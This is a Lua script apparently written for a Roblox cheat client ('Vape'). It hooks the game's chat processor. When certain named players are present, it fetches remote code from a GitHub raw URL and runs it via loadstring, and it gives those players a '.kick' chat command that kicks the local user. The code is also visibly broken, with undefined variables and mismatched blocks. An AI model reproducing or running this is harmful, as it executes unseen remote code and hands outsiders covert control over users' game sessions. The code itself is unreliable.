local messageservice = getconnections(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.OnNewMessage.OnClientEvent)
if messageservice.Function and #debug.getupvalues(messageservice.Function) > 0 and type(debug.getupvalues(messageservice.Function)[1]) == "table" and getmetatable(debug.getupvalues(messageservice.Function)[1]) and getmetatable(debug.getupvalues(messageservice.Function)[1]).GetChannel then
    oldfunc = getmetatable(debug.getupvalues(messageservice.Function)[1].ChatBar.CommandProcessor).ProcessCompletedChatMessage
    oldtab = getmetatable(debug.getupvalues(messageservice.Function)[1].ChatBar.CommandProcessor)
    getmetatable(debug.getupvalues(v.Function)[1].ChatBar.CommandProcessor).ProcessCompletedChatMessage = function(self, message, chatwindow)
        local res = oldfunc(self, message, chatwindow)
        if players.table0x54 then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
	        VapeGui["CreateNotification"]("Rise Detected", "table0x54 is in ur game", 5)
                if message:sub(1, 5) == ".kick" then
                    if message:find(lplr.Name, reason) then
                        local args = msg:gsub(".kick " ..lplr.Name, reason)
                        lplr:Kick(args)
                    end
                    game.StarterGui:SetCore("ChatMakeSystemMessage",{
							Text = "Kick now"
					})
                return true
            elseif players.XylexIsCanada then
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/NTDCore/Chattags/main/Loader.lua"))()
	                    VapeGui["CreateNotification"]("Rise Detected", "XylexIsCanada is in ur game", 5)
                        if message:sub(1, 5) == ".kick" then
                            if message:find(lplr.Name, reason) then
                                local args = msg:gsub(".kick " ..lplr.Name, reason)
                                lplr:Kick(args)
                             end
                            game.StarterGui:SetCore("ChatMakeSystemMessage",{
							    Text = "Kick now"
					        })
                        return true
                    end
                end
